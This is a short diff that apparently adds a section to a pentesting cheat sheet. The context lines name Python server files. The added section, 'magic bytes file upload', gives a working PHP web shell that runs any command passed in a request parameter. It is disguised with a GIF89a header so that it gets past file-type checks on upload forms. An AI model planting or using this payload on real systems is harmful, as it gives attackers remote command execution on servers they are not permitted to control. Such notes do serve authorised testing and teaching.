@@ -151,3 +151,10 @@ run.py
 wsgi.py
 asgi.py
 ```
+---
+# magic bytes file upload
+```bash
+# cat ex.php
+GIF89a;
+<?php system($_REQUEST['cmd']) ;?>
+```
